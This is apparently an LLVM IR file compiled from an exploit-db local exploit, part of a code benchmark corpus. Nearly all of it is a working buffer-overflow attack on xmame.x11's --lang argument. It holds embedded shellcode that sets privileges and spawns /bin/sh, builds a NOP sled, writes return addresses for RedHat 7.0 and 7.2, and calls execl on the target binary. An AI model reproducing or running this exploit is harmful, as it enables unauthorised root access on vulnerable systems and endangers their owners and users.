; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22703.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22703.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@OFFSET = common dso_local global i32 0, align 4
@__const.main.shellcode1 = private unnamed_addr constant [70 x i8] c"3\DB3\C0\B0\1B\CD\801\DB\89\D8\B0\17\CD\801\C0PP\B0\B5\CD\80\EB\1F^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\08\8DV\0C\CD\801\DB\89\D8@\CD\80\E8\DC\FF\FF\FF/bin/sh\00", align 16
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i8] c"usage: %s <os_type> \0A\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"types:\0A RedHat 7.0 - [1]\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"\0A RedHat 7.2 - [2]\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [36 x i8] c"Exploiting compress for RedHat 7.0\0A\00", align 1
@RET_70 = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [36 x i8] c"Exploiting compress for RedHat 7.2\0A\00", align 1
@RET_72 = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"/usr/local/bin/xmame.x11\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"--lang\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [70 x i8], align 16
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  %13 = load i32, i32* @OFFSET, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %7, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %8, align 8
  %17 = bitcast [70 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 getelementptr inbounds ([70 x i8], [70 x i8]* @__const.main.shellcode1, i32 0, i32 0), i64 70, i1 false)
  %18 = load i32, i32* %4, align 4
  %19 = icmp ne i32 %18, 2
  br i1 %19, label %20, label %30

20:                                               ; preds = %2
  %21 = load i32, i32* @stderr, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i32, i8*, ...) @fprintf(i32 %21, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8* %24)
  %26 = load i32, i32* @stderr, align 4
  %27 = call i32 (i32, i8*, ...) @fprintf(i32 %26, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %28 = load i32, i32* @stderr, align 4
  %29 = call i32 (i32, i8*, ...) @fprintf(i32 %28, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  store i32 1, i32* %12, align 4
  br label %85

30:                                               ; preds = %2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33)
  store i32 %34, i32* %9, align 4
  %35 = load i32, i32* %9, align 4
  switch i32 %35, label %46 [
    i32 1, label %36
    i32 2, label %41
  ]

36:                                               ; preds = %30
  %37 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0))
  %38 = load i32, i32* @RET_70, align 4
  %39 = load i32, i32* @OFFSET, align 4
  %40 = sub nsw i32 %38, %39
  store i32 %40, i32* %10, align 4
  br label %46

41:                                               ; preds = %30
  %42 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0))
  %43 = load i32, i32* @RET_72, align 4
  %44 = load i32, i32* @OFFSET, align 4
  %45 = sub nsw i32 %43, %44
  store i32 %45, i32* %10, align 4
  br label %46

46:                                               ; preds = %30, %41, %36
  store i32 0, i32* %6, align 4
  br label %47

47:                                               ; preds = %57, %46
  %48 = load i32, i32* %6, align 4
  %49 = load i32, i32* @OFFSET, align 4
  %50 = sub nsw i32 %49, 1
  %51 = icmp sle i32 %48, %50
  br i1 %51, label %52, label %60

52:                                               ; preds = %47
  %53 = load i8, i8* @NOP, align 1
  %54 = load i32, i32* %6, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %16, i64 %55
  store i8 %53, i8* %56, align 1
  br label %57

57:                                               ; preds = %52
  %58 = load i32, i32* %6, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %6, align 4
  br label %47

60:                                               ; preds = %47
  %61 = load i32, i32* @OFFSET, align 4
  %62 = sub nsw i32 %61, 301
  store i32 %62, i32* %6, align 4
  br label %63

63:                                               ; preds = %75, %60
  %64 = load i32, i32* %6, align 4
  %65 = load i32, i32* @OFFSET, align 4
  %66 = sub nsw i32 %65, 1
  %67 = icmp sle i32 %64, %66
  br i1 %67, label %68, label %78

68:                                               ; preds = %63
  %69 = load i32, i32* %10, align 4
  %70 = load i32, i32* %6, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %6, align 4
  %72 = sext i32 %70 to i64
  %73 = getelementptr inbounds i8, i8* %16, i64 %72
  %74 = bitcast i8* %73 to i32*
  store i32 %69, i32* %74, align 1
  br label %75

75:                                               ; preds = %68
  %76 = load i32, i32* %6, align 4
  %77 = add nsw i32 %76, 4
  store i32 %77, i32* %6, align 4
  br label %63

78:                                               ; preds = %63
  %79 = getelementptr inbounds i8, i8* %16, i64 200
  %80 = getelementptr inbounds [70 x i8], [70 x i8]* %11, i64 0, i64 0
  %81 = getelementptr inbounds [70 x i8], [70 x i8]* %11, i64 0, i64 0
  %82 = call i32 @strlen(i8* %81)
  %83 = call i32 @memcpy(i8* %79, i8* %80, i32 %82)
  %84 = call i32 @execl(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0), i8* %16, i32* null)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %12, align 4
  br label %85

85:                                               ; preds = %78, %20
  %86 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %86)
  %87 = load i32, i32* %3, align 4
  ret i32 %87
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #3

declare dso_local i32 @atoi(i8*) #3

declare dso_local i32 @printf(i8*) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
